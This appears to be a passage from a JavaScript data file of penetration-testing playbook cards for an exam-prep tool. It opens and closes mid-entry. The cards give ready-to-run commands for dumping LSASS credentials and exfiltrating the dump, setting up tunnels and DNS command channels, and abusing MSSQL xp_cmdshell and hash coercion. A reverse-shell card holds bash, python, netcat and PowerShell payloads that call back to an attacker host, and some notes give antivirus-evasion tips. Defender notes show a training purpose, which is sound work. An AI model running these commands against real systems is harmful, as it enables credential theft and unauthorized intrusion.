{id:'lsass-dump-onbox',lane:'windows-privesc',title:'On-Box LSASS Memory Dump',hypothesis:'LSASS holds the credentials of every logged-on user in memory. As admin/SYSTEM you can dump its process with built-in comsvcs.dll (no tools uploaded) or procdump, exfiltrate the .dmp, and parse it offline with pypykatz — plaintext passwords, NT hashes, and Kerberos tickets of anyone logged in. This is the reliable complement to remote secrets dumping when you only have a shell on the box.',prereq:{any:['access.admin','access.system']},produces:['credential.plaintext','hash.ntlm','ad.tickets'],commands:[{tool:'powershell',run:'Get-Process lsass',note:'Get the LSASS PID first — comsvcs MiniDump needs it. tasklist /svc also shows it.'},{tool:'cmd',run:'rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full',note:'Built-in LOLBin dump — replace 672 with the actual PID, run from an elevated prompt. Nothing uploaded; comsvcs.dll MiniDump is a documented Windows feature. (Defender watches this exact string on modern boxes; procdump is the fallback.)'},{tool:'sh',run:'procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp',note:'Sysinternals alternative when comsvcs is blocked. Serve procdump from your box (see file-transfer).'},{tool:'impacket-smbserver',run:'impacket-smbserver -smb2support CompData .',note:'On YOUR box: receive the dump. From the target: move C:\\Windows\\Temp\\lsass.dmp \\\\{{lhost}}\\CompData'},{tool:'pypykatz',run:'pypykatz lsa minidump lsass.dmp',note:'Parse offline on your box. Logonpasswords, NT hashes, and Kerberos tickets for every session captured — spray nothing, reuse everything. mimikatz sekurlsa::minidump + sekurlsa::logonpasswords is the Windows-parse variant.'}],expected:['full','Dump 1 completed','== LogonSession =='],onFailure:{'Access is denied':{note:'Not elevated, or Credential Guard is protecting LSASS (Server 2016+/Win10 Enterprise). Check: reg query HKLM\\System\\CurrentControlSet\\Control\\Lsa /v RunAsPPL. PPL active = signature or token route instead.'},'Antivirus quarantined the dump':{note:'Rename the output (.bin, no "lsass" in the name), dump to a non-standard path, or compress immediately. Record AV behavior for the report.'}},defender:'LSASS access by non-SYSTEM processes is THE crown-jewel detection (Event 10 with GrantedAccess 0x1010); comsvcs MiniDump and procdump both have signatures. Expect alerts.',report:{finding:'Credentials Extractable from LSASS Memory',severity:'critical'},tools:['cmd','procdump','pypykatz','impacket-smbserver'],os:['windows'],refs:['https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/','https://github.com/skelsec/pypykatz']}
]});

// Pivoting & tunneling (ladder adapted from Charon docs/TUNNELING.md)
window.OBOL_LANES.push({ lane:'pivoting', phase:'Lateral Movement & Pivoting', title:'Pivoting & Tunneling', version:0.1, cards:[

{id:'pivot-detect',lane:'pivoting',title:'Detect Dual-Homed Hosts',hypothesis:'A foothold with two interfaces is a door to a second network. ipconfig / ip a shows the extra interface; the ARP table and routes hint at live neighbors. Everything pivoted flows through this host, so map before you tunnel.',prereq:{any:['foothold.linux','foothold.windows']},produces:['host.dual_homed','pivot.required'],commands:[{tool:'sh',run:'ip a; ip route; ip neigh',note:'Linux: interfaces, routes, and known neighbors.'},{tool:'sh',run:'ipconfig /all && route print && arp -a',note:'Windows equivalent.'}],expected:['172.','10.','192.168.'],onFailure:{'single interface':{note:'Not dual-homed. Check for other pivot signals: mounted shares, RDP history, hosts file entries, listening services bound to other networks.'}},defender:'',report:{finding:'Dual-Homed Host Identified',severity:'informational'},tools:[]},

{id:'pivot-chooser',lane:'pivoting',title:'Which Tunnel When (60-Second Decision)',hypothesis:'Four questions pick your tool: (1) Have SSH creds on the pivot? → ssh -D for SOCKS or ssh -L for a single port (zero uploads). (2) No SSH but you can upload one binary? → chisel reverse SOCKS (easiest, works everywhere). (3) Doing heavy work through the pivot (nmap, impacket, Kerberos)? → ligolo-ng for a real routed interface. (4) Just need ONE port reachable? → socat relay (Linux) or netsh portproxy (Windows). Cards below follow this order.',prereq:{any:['pivot.required','foothold.linux','foothold.windows']},produces:[],commands:[{tool:'ssh',run:'ssh -D 1080 -N {{user}}@{{target}}',note:'Have SSH creds → instant SOCKS, nothing uploaded. See ssh-dynamic / ssh-port-forward.'},{tool:'chisel',run:'chisel server -p 443 --reverse   # then on pivot: chisel client {{lhost}}:443 R:socks',note:'Can upload a binary → chisel. The corpus favorite; Windows-friendly.'},{tool:'ligolo-proxy',run:'ligolo-proxy -selfcert -laddr 0.0.0.0:11601',note:'Heavy tooling ahead → ligolo. Real interface, no proxychains.'}],expected:[],onFailure:{},defender:'',report:{finding:'',severity:'informational'},tools:['ssh','chisel','ligolo-proxy'],refs:['https://github.com/nicocha30/ligolo-ng','https://github.com/jpillora/chisel']},

{id:'ligolo',lane:'pivoting',title:'Ligolo-ng (Route-Backed Tunnel)',hypothesis:'The premium tunnel: creates a real routed interface on YOUR box, so tools address internal IPs directly — no proxychains wrapper, full speed, nmap and impacket work properly. Worth the setup whenever you can upload one binary to the pivot. Follow the steps in order; each note says which side it runs on.',prereq:{any:['pivot.required']},produces:['route.proven'],commands:[{tool:'sh',run:'sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up',note:'STEP 1 (your box, once ever): create the ligolo interface.'},{tool:'ligolo-proxy',run:'ligolo-proxy -selfcert -laddr 0.0.0.0:11601',note:'STEP 2 (your box): start the proxy, leave it running. Upload ligolo-agent to the pivot (see file-transfer card).'},{tool:'sh',run:'./agent -connect {{lhost}}:11601 -ignore-cert',note:'STEP 3 (on the pivot): connect back. Windows: agent.exe -connect {{lhost}}:11601 -ignore-cert'},{tool:'ligolo-proxy',run:'session',note:'STEP 4 (ligolo-proxy console): `session` to select the agent, `ifconfig` to see its internal interfaces, `start` to bring the tunnel up.'},{tool:'sh',run:'sudo ip route add 172.16.0.0/24 dev ligolo',note:'STEP 5 (your box): route the internal subnet from ifconfig through the tunnel. Now `nmap 172.16.0.5` just works.'}],expected:['Agent connected','session joined'],onFailure:{'agent cannot connect back':{note:'Egress filtering on the pivot. Rerun the proxy on 443, or fall back to chisel reverse SOCKS.',card:'chisel-socks'},'no such device':{note:'Step 1 did not run or tun module missing: sudo modprobe tun, redo step 1.'}},defender:'New tun interfaces and routes live on the attacker side only; the pivot shows the agent process and one outbound connection.',report:{finding:'Network Pivot Established',severity:'medium'},tools:['ligolo-proxy','ligolo-agent'],refs:['https://github.com/nicocha30/ligolo-ng']},

{id:'chisel-socks',lane:'pivoting',title:'Chisel Reverse SOCKS',hypothesis:'0xdf\'s favorite pivot: the pivot connects OUT to you, so inbound filtering on the pivot does not matter, and one static binary runs on anything (Windows too). Traffic goes through proxychains — SOCKS, so TCP only. Three steps: server on your box, client on the pivot, proxychains on your tools.',prereq:{any:['pivot.required']},produces:['route.proven'],commands:[{tool:'chisel',run:'chisel server -p 8000 --reverse',note:'STEP 1 (your box): start the server allowing reverse tunnels. Port 443 instead of 8000 if egress is filtered.'},{tool:'chisel',run:'chisel client {{lhost}}:8000 R:socks',note:'STEP 2 (on the pivot): reverse SOCKS — a SOCKS proxy appears on YOUR port 1080. Windows: chisel.exe client {{lhost}}:8000 R:socks'},{tool:'sh',run:"printf 'strict_chain\n[ProxyList]\nsocks5 127.0.0.1 1080\n' > /etc/proxychains.conf",note:'STEP 3 (your box, once): point proxychains at the chisel SOCKS.'},{tool:'sh',run:'proxychains -q nmap -sT -Pn -n --top-ports 100 172.16.0.5',note:'Use it: prefix any tool with proxychains. nmap needs -sT -Pn -n (no SYN, no ping, no DNS through SOCKS). Kerberos works through it: proxychains impacket-psexec ...'}],expected:['Connected','Listening'],onFailure:{'connection refused':{note:'Server not up or egress blocked — try 443 as the server port, and verify with proxychains curl first.'}},defender:'The pivot shows an outbound TLS-ish session; long-lived connections from servers to odd ports are a hunting staple.',report:{finding:'Network Pivot Established',severity:'medium'},tools:['chisel','proxychains'],refs:['https://github.com/jpillora/chisel']},

{id:'ssh-port-forward',lane:'pivoting',title:'SSH Port Forwards (-L and -R)',hypothesis:'The most-used pivot in the corpus is not a tunnel at all — it is a single-port forward over the SSH you already have. -L brings a target-internal service to YOUR localhost (internal web apps, WinRM, MySQL bound to 127.0.0.1). -R exposes YOUR listener/service on the target. Zero uploads, works everywhere SSH does.',prereq:{all:['credential.available'],any:['ssh.reachable','foothold.linux']},produces:['port.forwarded'],commands:[{tool:'ssh',run:'ssh -N -L 8000:localhost:8000 {{user}}@{{target}}',note:'Local forward: target\'s 127.0.0.1:8000 (or any internal IP:port) appears on YOUR localhost:8000. Browse http://localhost:8000. -N = no shell, tunnel only.'},{tool:'ssh',run:'ssh -N -L 19999:localhost:19999 -L 8125:localhost:8125 -L 43143:localhost:43143 {{user}}@{{target}}',note:'Chain multiple -L flags for multiple services in one session (corpus: editor, horizontall, pivotapi all do this).'},{tool:'ssh',run:'ssh -N -R 9999 {{user}}@{{target}}',note:'Remote forward: YOUR localhost:9999 becomes reachable from the TARGET — great for catching reverse shells through a firewall or serving files to the internal side.'},{tool:'ssh',run:'ssh.exe -N -L 4445:127.0.0.1:445 {{user}}@{{target}}',note:'Windows has a native OpenSSH client since Win10 1809 (C:\\Windows\\System32\\OpenSSH\\ssh.exe) — same -L/-R/-D flags, no uploads needed. From a Windows beachhead this beats installing anything.'},{tool:'plink',run:'plink.exe -ssh -l {{user}} -pw {{password}} -R {{lport}}:127.0.0.1:{{lport}} {{lhost}}',note:'plink.exe is the classic Windows SSH client for scripted reverse tunnels — accepts the host key non-interactively with -hostkey or by piping "y". See the plink-socks card for the full pivot.'}],expected:[''],onFailure:{'Address already in use':{note:'Local port taken — change the left side: -L 8888:localhost:8000.'},'remote port forwarding failed':{note:'Target sshd has GatewayPorts/AllowTcpForwarding restrictions; try another port or a chisel fallback.',card:'chisel-socks'}},defender:'sshd logs forwarded connections (direct-tcpip channels); heavy forward volume stands out.',report:{finding:'Network Pivot Established',severity:'medium'},tools:['ssh'],os:['linux']},

{id:'socat-relay',lane:'pivoting',title:'socat Port Relay (on the pivot)',hypothesis:'socat is the pocket knife for moving a port: relay a listener on the pivot to you, bridge two networks, or upgrade a dumb shell to a real one. Corpus classic (rebound): when the target can only reach itself on a port you need (RPC 135), socat on the pivot forwards it onward.',prereq:{any:['foothold.linux']},produces:['port.forwarded'],commands:[{tool:'socat',run:'socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{lhost}}:9999',note:'On the pivot: listen on 135, forward every connection to you. The rebound pattern — works when a service will only talk to the pivot\'s own address.'},{tool:'socat',run:'socat TCP-LISTEN:8080,fork TCP:172.16.0.5:80',note:'Bridge: expose an internal web server (172.16.0.5:80) on the pivot\'s 8080, reachable through your existing forward.'},{tool:'socat',run:"socat file:`tty`,raw,echo=0 tcp-listen:4444",note:'Bonus: full-TTY shell upgrade — socat listener locally, then from the target: socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{{lhost}}:4444'}],expected:['listening on'],onFailure:{'command not found':{note:'No socat on target — upload the static binary, or use SSH forwards instead.',card:'ssh-port-forward'}},defender:'socat relay processes with fork are a classic hunt item.',report:{finding:'',severity:'informational'},tools:['socat'],os:['linux']},

{id:'netsh-portproxy',lane:'pivoting',title:'netsh portproxy (Windows Pivot)',hypothesis:'No socat on Windows, but netsh portproxy is built in: a pivot host can listen on one port and forward to another host:port entirely with native tooling. Needs admin on the pivot and (usually) a firewall rule.',prereq:{any:['access.admin','access.system']},produces:['port.forwarded'],commands:[{tool:'sh',run:'netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.0.5',note:'On the Windows pivot (admin): forward its :8080 to an internal target :80.'},{tool:'sh',run:'netsh advfirewall firewall add rule name="pp8080" dir=in action=allow protocol=TCP localport=8080',note:'Open the firewall or your forward is unreachable.'},{tool:'sh',run:'netsh interface portproxy show all',note:'List active forwards. Clean up with: netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0'}],expected:['v4tov4'],onFailure:{'access denied':{note:'Needs elevated prompt — this is a post-privesc tool.'}},defender:'portproxy rules and new firewall rules both log; netsh advfirewall changes alert.',report:{finding:'',severity:'informational'},tools:['sh'],os:['windows'],refs:['https://lolbas-project.github.io/']},

{id:'ssh-dynamic',lane:'pivoting',title:'SSH Dynamic SOCKS',hypothesis:'If you have SSH credentials or a key on the pivot, ssh -D is the zero-upload tunnel: no binaries, nothing written to disk, instant SOCKS.',prereq:{any:['pivot.required','credential.available']},produces:['route.proven'],commands:[{tool:'ssh',run:'ssh -D 1080 -N {{user}}@{{target}}',note:'-N: no shell, just the tunnel. Background with -f if you want your terminal back.'}],expected:[''],onFailure:{'Permission denied':{note:'Cred issue, or SSH restricted to certain users. Keys in ~/.ssh on the foothold often outlive passwords.'}},defender:'Outbound SSH session with high traffic volume; sshd logs the connection.',report:{finding:'Network Pivot Established',severity:'medium'},tools:['ssh']},

{id:'tunnel-verify',lane:'pivoting',title:'Prove the Route',hypothesis:'A listening SOCKS port proves nothing — the tunnel can be up while the route is dead. Always verify with a canary: sweep one known internal host through the tunnel and confirm responses before you invest in deeper pivoted enumeration.',prereq:{any:['route.proven','pivot.required']},produces:['pivot.confirmed'],commands:[{tool:'sh',run:'proxychains -q nmap -sT -Pn -p 445,80,22 172.16.0.5',note:'Canary sweep on the internal target. Any open port = the route is real.'}],expected:['open'],onFailure:{'all filtered/closed':{note:'Route dead or canary down. Pick a different internal host — the DC if known — and re-verify the tunnel itself is still listening.',card:'chisel-socks'}},defender:'',report:{finding:'Pivot Route Verified',severity:'informational'},tools:['proxychains','nmap']},

{id:'sshuttle-pivot',lane:'pivoting',title:'sshuttle (VPN-over-SSH)',hypothesis:'When you have plain SSH into a dual-homed host, sshuttle builds a transparent VPN-style route through it — no proxychains wrapper needed per-tool, no server-side setup, just python on the target. The lowest-friction pivot when SOCKS-proxy-everything gets tedious.',prereq:{all:['foothold.linux','pivot.dual_homed'],any:['ssh.reachable']},produces:['pivot.route'],commands:[{tool:'sshuttle',run:'sshuttle -r {{user}}@{{target}} 10.10.11.0/24',note:'Route the internal subnet through the SSH foothold. Needs root on YOUR box (sudo). Target only needs python.'},{tool:'sshuttle',run:"sshuttle -r {{user}}@{{target}} 10.10.11.0/24 --ssh-cmd 'ssh -i {{file}}'",note:'Key-based variant when password auth is off.'},{tool:'nmap',run:'nmap -sT -p 22,80,445 10.10.11.5',note:'After sshuttle: scan the internal network directly. Use -sT (full connect) — raw sockets do not traverse sshuttle.'}],expected:['c : Connected','client connected'],onFailure:{'python not found':{note:'Target lacks python — fall back to chisel/ligolo (see other pivot cards).'},'route exists':{note:'Subnet overlaps your own routes; pick a narrower CIDR.'}},defender:'Long-lived SSH session with heavy forwarded traffic; unusual for normal users.',report:{finding:'',severity:'informational'},tools:['sshuttle','nmap'],os:['linux'],refs:['https://github.com/sshuttle/sshuttle']},

{id:'plink-socks',lane:'pivoting',title:'Plink (SSH Pivoting from Windows)',hypothesis:'The pivot is Windows and has no ssh client? plink.exe (PuTTY link) is the answer: a single binary that speaks SSH with all the forwarding flags — -D for a local SOCKS on the Windows pivot, -R for a remote forward back to you. Upload one exe, get tunneling. Also the trick for turning a Windows foothold into a jump host without installing anything.',prereq:{any:['foothold.windows','pivot.required']},produces:['route.proven','port.forwarded'],commands:[{tool:'sh',run:'plink.exe -ssh -D 9050 {{user}}@{{lhost}}',note:'On the Windows pivot: dynamic SOCKS to YOUR box (user = an account on your own Kali/attack box — create a throwaway one). This puts a SOCKS listener on the PIVOT:9050 — useful when internal hosts must reach services through the pivot.'},{tool:'sh',run:'plink.exe -ssh -R 127.0.0.1:1080:127.0.0.1:1080 {{user}}@{{lhost}} -N',note:'Remote-forward flavor: bridge your local chisel/ssh SOCKS port through the pivot. -N for no shell. Combine with -pw for scripts, -batch to suppress prompts.'},{tool:'sh',run:'cmd.exe /c echo y | plink.exe -ssh {{user}}@{{lhost}} -pw {{password}} exit',note:'First connection caches the host key — echo y pastes past the interactive prompt so scripted connects do not hang forever.'}],expected:['Access granted','Opening connection'],onFailure:{' hangs on Store key in cache':{note:'The interactive host-key prompt — answer it once manually or use the echo y trick above.'},'Unable to open connection':{note:'SSH from the pivot to you is blocked — test egress first, or reverse the direction (your ssh -R TO the pivot if it has sshd, see ssh-port-forward).'}},defender:'plink.exe spawning from servers/workstations is a known LOLBin-adjacent hunt item; the outbound :22 connection is the tell.',report:{finding:'Network Pivot Established',severity:'medium'},tools:['plink'],os:['windows'],refs:['https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html']},

{id:'dnscat2-tunnel',lane:'pivoting',title:'dnscat2 (DNS Tunneling — Last Resort Egress)',hypothesis:'When every port is blocked but DNS resolves (very common: the pivot can ask the DC/resolver for records), dnscat2 tunnels a full command channel inside DNS queries. Slow but nearly unstoppable — use it for C2-ish interaction and small file moves, not for nmap. Server on your box with a domain you control (or direct-to-IP mode on labs), client on the pivot.',prereq:{any:['pivot.required']},produces:['route.proven'],commands:[{tool:'dnscat2',run:'ruby dnscat2.rb {{domain}} -e open --no-cache',note:'STEP 1 (your box): start the server. Note the secret it prints — the client needs it. No real domain? Use --dns server=x.x.x.x,port=53 direct mode on the client instead.'},{tool:'sh',run:'./dnscat --secret=<secret> {{domain}}',note:'STEP 2 (on the pivot): run the client. Direct-IP variant when no domain exists: ./dnscat --dns server={{lhost}},port=53 --secret=<secret>. Windows build available from the repo releases.'},{tool:'dnscat2',run:'window -i 1',note:'STEP 3 (dnscat2 console): windows lists sessions, window -i 1 interacts with the shell. command (ubuntu) session variant: start a command session for a real shell feel.'},{tool:'sh',run:'for i in $(seq 200 220); do timeout 1 bash -c "echo > /dev/tcp/172.16.137.$i/4646" 2>/dev/null && echo "OPEN: 172.16.137.$i:4646"; done',note:'STEP 4: THROUGH the dnscat shell, light-touch port checks on internal hosts — a bash /dev/tcp sweep is enough to map the next hop before committing to a real tunnel.'}],expected:['New window created','Session established'],onFailure:{'no session arrives':{note:'DNS egress truly blocked, or the client cannot resolve. Verify with nslookup something.{{domain}} from the pivot — your server should log the query even without a full session.'}},defender:'Long TXT/NULL query streams with high entropy to one domain are textbook DNS-tunnel detection; dnscat2 has known signatures.',report:{finding:'DNS Tunneling Channel Established',severity:'medium'},tools:['dnscat2'],os:['linux','windows'],refs:['https://github.com/iagox86/dnscat2']}
]});

// Shells & file transfer
window.OBOL_LANES.push({ lane:'shells', phase:'Shells & Tooling', title:'Shells & File Transfer', version:0.1, cards:[

{id:'listener-setup',lane:'shells',title:'Listener Setup',hypothesis:'A listener is your half of every reverse shell. rlwrap-wrapped netcat gives you history and arrow keys; set the port BEFORE you trigger anything, and match it to what egress allows (443 and 53 get out when 1337 does not).',prereq:{any:['foothold.webshell','web.lfi_confirmed','web.upload_confirmed','scope.defined']},produces:['listener.up'],commands:[{tool:'rlwrap',run:'rlwrap -cAr nc -lvnp {{lport}}',note:'Start this FIRST. Nothing sadder than a shell calling home to silence.'}],expected:['Listening on'],onFailure:{'shell connects and drops':{note:'Often AV eating the payload, or the shell needs stabilizing immediately. Have your upgrade command ready.'}},defender:'',report:{finding:'',severity:'informational'},tools:['rlwrap','nc']},

{id:'tty-upgrade',lane:'shells',title:'Shell Upgrade (Full TTY)',hypothesis:'Raw reverse shells break on sudo, arrows, Ctrl+C, and tab completion. Upgrade to a full PTY immediately — it makes everything after it less painful.',prereq:{any:['foothold.linux']},produces:['shell.stable'],commands:[{tool:'sh',run:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",note:'In the shell. Then: Ctrl+Z to background it.'},{tool:'sh',run:'stty raw -echo; fg',note:'On YOUR terminal, then fg to return. Enter once more.'},{tool:'sh',run:'export TERM=xterm-256color && stty rows 50 cols 200',note:'In the shell again. Tab-complete, Ctrl+C, and sudo now work.'}],expected:['$'],onFailure:{'python3 not found':{note:'Try python, script -qc /bin/bash /dev/null, or /usr/bin/script.'}},defender:'',report:{finding:'',severity:'informational'},tools:['python3'],os:['linux'],refs:['https://github.com/infodox/python-pty-shells']},

{id:'file-transfer',lane:'shells',title:'File Transfer To/From Target',hypothesis:'Moving tools in and loot out is constant. Serve files from your box over HTTP (the mentor can host this for you) and pull them from the target; exfiltrate the same way in reverse. On Windows, certutil and PowerShell are the built-ins; on Linux, curl/wget.',prereq:{any:['foothold.linux','foothold.windows']},produces:['file.staged'],commands:[{tool:'python3',run:'python3 -m http.server 8000',note:'On your box, in the directory with your tools. The mentor stages this automatically.'},{tool:'sh',run:'curl -O http://{{lhost}}:8000/linpeas.sh || wget http://{{lhost}}:8000/linpeas.sh',note:'Linux pull.'},{tool:'sh',run:'certutil -urlcache -f http://{{lhost}}:8000/winPEASx64.exe wp.exe',note:'Windows pull via certutil (logs in Defender, FYI). iwr -Uri ... -OutFile is the PowerShell way.'},{tool:'impacket-smbserver',run:'impacket-smbserver share . -smb2support',note:'Alternative: serve an SMB share from your box; targets copy with copy \\\\{{lhost}}\\share\\file. Works when HTTP egress is blocked.'}],expected:['200 OK','copied'],onFailure:{'connection refused/timeout':{note:'Egress blocked on that port. Retry on 443/53, or go the SMB-share route.',card:'file-transfer'}},defender:'certutil -urlcache and powershell iwr to external IPs are both watched closely.',report:{finding:'',severity:'informational'},tools:['python3','impacket-smbserver'],refs:['https://github.com/fortra/impacket','https://lolbas-project.github.io/']},

{id:'ssh-creds',lane:'shells',title:'SSH Access with Found Credentials',hypothesis:'Credentials turn into shells through SSH constantly. sshpass scripts password auth; found id_rsa keys need strict permissions before ssh accepts them; and encrypted keys crack with ssh2john + john. Also check EVERY found password for SSH reuse — the corpus\'s most common foothold.',prereq:{all:['credential.available'],any:['ssh.reachable','port:22']},produces:['foothold.linux'],commands:[{tool:'sshpass',run:"sshpass -p '{{password}}' ssh -o StrictHostKeyChecking=no {{user}}@{{target}}",note:'Password auth without the interactive prompt. StrictHostKeyChecking=no avoids first-connect stalls.'},{tool:'sh',run:'chmod 600 {{file}} && ssh -i {{file}} {{user}}@{{target}}',note:'Private key login. ssh refuses world-readable keys — chmod first, always.'},{tool:'sh',run:'ssh2john.py {{file}} > id_rsa.hash && john --wordlist={{wordlist}} id_rsa.hash',note:'Encrypted key? Convert and crack the passphrase (hashcat cannot do this one).'}],expected:['$ ','uid='],onFailure:{'Permission denied (publickey)':{note:'Password auth disabled — you need a key. Hunt for id_rsa in web roots, backups, home dirs, and git history.'}},defender:'auth.log records every attempt; key fingerprints and new IPs stand out.',report:{finding:'SSH Access via Reused/Weak Credentials',severity:'high'},tools:['sshpass','ssh','john'],os:['linux']},

{id:'rdp-access',lane:'shells',title:'RDP Access with Found Credentials',hypothesis:'Valid Windows creds + 3389 open = a desktop. xfreerdp is the modern Kali client; watch for Network Level Authentication (blocks logon with local accounts sometimes) and Restricted Admin mode (enables pass-the-hash). A GUI session also reveals things a shell hides: open windows, saved sessions, sticky notes.',prereq:{all:['credential.available'],any:['rdp.reachable','port:3389']},produces:['foothold.windows','access.desktop'],commands:[{tool:'xfreerdp',run:"xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' /cert:ignore /dynamic-resolution",note:'Standard connection. /dynamic-resolution resizes cleanly; /cert:ignore skips cert prompts.'},{tool:'xfreerdp',run:"xfreerdp /v:{{target}} /u:{{user}} /d:{{domain}} /pth:{{hash}} /cert:ignore",note:'Pass-the-hash variant — works when Restricted Admin mode is enabled on the target.'},{tool:'xfreerdp',run:"xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' /cert:ignore +clipboard /drive:share,{{file}}",note:'Clipboard sharing and a mapped drive for two-way file transfer through the RDP session.'}],expected:['Certificate details','freerdp'],onFailure:{'NLA':{note:'CredSSP/NLA rejected the auth — local vs domain account confusion (try .\\{{user}} or {{domain}}\\{{user}}), or the account lacks Remote Desktop Users membership.'},'need a tunnel through RDP':{note:'SocksOverRDP (nccgroup): regsvr32 SocksOverRDP-Plugin.dll on the server side plus the client plugin gives you a SOCKS proxy riding the RDP channel itself — verify with netstat -antb | findstr 1080. No extra ports, no extra tools reaching the network.'}},defender:'4624/4625 logon type 10 events; new-source RDP logons are a standard detection.',report:{finding:'RDP Access via Valid Credentials',severity:'high'},tools:['xfreerdp'],os:['windows'],refs:['https://github.com/nccgroup/SocksOverRDP']},

{id:'reverse-shells',lane:'shells',title:'Reverse Shell Payload Reference',hypothesis:'The payload depends on what the target HAS: bash on most Linux, python almost everywhere, nc variants with and without -e, PowerShell on Windows. Keep this card open while exploiting; start your listener first (see listener-setup). All of these are human-run — type them yourself, understand what they do.',prereq:{any:['foothold.linux','foothold.windows','web.sqli_confirmed','exploit.candidate']},produces:['shell.reverse'],commands:[{tool:'sh',run:'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1',note:'The bash classic. Works wherever /dev/tcp exists (bash only — not sh/dash!).'},{tool:'python3',run:"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{lhost}}\",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",note:'Python fallback — survives where bash /dev/tcp does not.'},{tool:'sh',run:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f',note:'nc without -e (OpenBSD netcat). The mkfifo dance is the reliable variant.'},{tool:'powershell',run:"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{lhost}}',{{lport}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"",note:'Windows PowerShell reverse shell. revshells.com generates this and every other variant with your IP/port filled.'}],expected:['connect to','uid=','PS C:\\'],onFailure:{'no connection':{note:'Check order: listener up FIRST, correct port, egress allowed from target (try 443/53/80), payload syntax matches the shell you are in.'}},defender:'Outbound connections from servers to attacker IPs are the single most-watched signal there is.',report:{finding:'',severity:'informational'},tools:['nc','python3','bash','powershell'],refs:['https://www.revshells.com/']}
]});

// Objectives & reporting discipline
window.OBOL_LANES.push({ lane:'objectives', phase:'Objectives & Reporting', title:'Objectives & Report', version:0.1, cards:[

{id:'flag-discipline',lane:'objectives',title:'Flag & Proof Discipline',hypothesis:'Points exist for proof, not shells. The moment you land: read the flag, screenshot it with the machine proof (whoami + ip), and record it in the box tracker. Losing points for missing proof you had access to five minutes ago is the classic exam tragedy.',prereq:{any:['foothold.linux','foothold.windows','access.admin','access.root','access.system']},produces:['objective.captured'],commands:[{tool:'sh',run:'cat /home/*/user.txt /root/root.txt 2>/dev/null; cat C:\\Users\\*\\Desktop\\*.txt 2>nul',note:'Read everything you can reach at your current level. Screenshot with context.'},{tool:'sh',run:'whoami; hostname; ip a 2>/dev/null || ipconfig',note:'The proof combo: identity + host + network in one shot, with the flag visible.'}],expected:[''],onFailure:{'flag not where expected':{note:'Some boxes move flags or require full admin for root.txt. Check desktop of admin users and the Administrator desktop specifically.'}},defender:'',report:{finding:'Objective Captured',severity:'informational'},tools:[]},

{id:'report-discipline',lane:'objectives',title:'Document As You Go',hypothesis:'The report is written during the exam, not after. Every command you ran, every output that mattered, every screenshot — captured at the moment it happened. Obol tracks this for you in the box tracker and evidence fields; the end-of-run report is assembly, not authorship.',prereq:{any:['scope.defined']},produces:['report.ready'],commands:[{tool:'obol',run:'Mark cards tried/succeeded as you go; paste key outputs into card evidence.',note:'The Report tab assembles findings, attack path, and command appendix from your progress.'}],expected:[''],onFailure:{'end of run, no notes':{note:'This is why Obol exists. Export the workspace JSON and the report draft and salvage what you can.'}},defender:'',report:{finding:'',severity:'informational'},tools:[]}
]});

// Database lane
window.OBOL_LANES.push({ lane:'database', phase:'Data Services', title:'Database Access', version:0.1, cards:[

{id:'mssql-access',lane:'database',title:'MSSQL Access and xp_cmdshell',hypothesis:'MSSQL credentials (from LLMNR captures, config files, or kerberoast) often belong to accounts with sysadmin. From there: xp_cmdshell gives command execution as the service account (usually with SeImpersonate — see the potato card), xp_dirtree to an SMB share coerces the service account\'s NTLMv2 hash for cracking or relay, and linked servers pivot the access onward. This is one of the most common AD foothold chains in the 0xdf corpus.',prereq:{all:['credential.available'],any:['mssql.reachable','port:1433']},produces:['db.mssql_access','foothold.windows','hash.netntlm'],commands:[{tool:'impacket-mssqlclient',run:"impacket-mssqlclient '{{domain}}/{{user}}:{{password}}'@{{target}} -windows-auth",note:'Windows-auth syntax. For local SQL logins drop the domain: {{user}}:{{password}}@{{target}}.'},{tool:'impacket-mssqlclient',run:"EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",note:'Enable and test command execution. If this works you are running as the MSSQL service account — check whoami /priv immediately.'},{tool:'impacket-mssqlclient',run:"EXEC master.dbo.xp_dirtree '\\\\{{lhost}}\\share';",note:'Coerces the service account to authenticate to YOUR responder share — captures its NTLMv2 hash even when xp_cmdshell is blocked. Service accounts are kerberoastable too, so you may already have it.'},{tool:'impacket-mssqlclient',run:'EXEC sp_linkedservers;',note:'Linked servers = pre-authenticated hops to other SQL servers. EXEC ... AT [linked] to run queries through them.'},{tool:'impacket-mssqlclient',run:"SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",note:'Not sysadmin yourself? Check IMPERSONATE rights — EXECUTE AS LOGIN = \'sa\' promotes you in-session. Enum: SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantee_principal_id = b.principal_id WHERE a.permission_name = \'IMPERSONATE\';'}],expected:['master','sysadmin','service 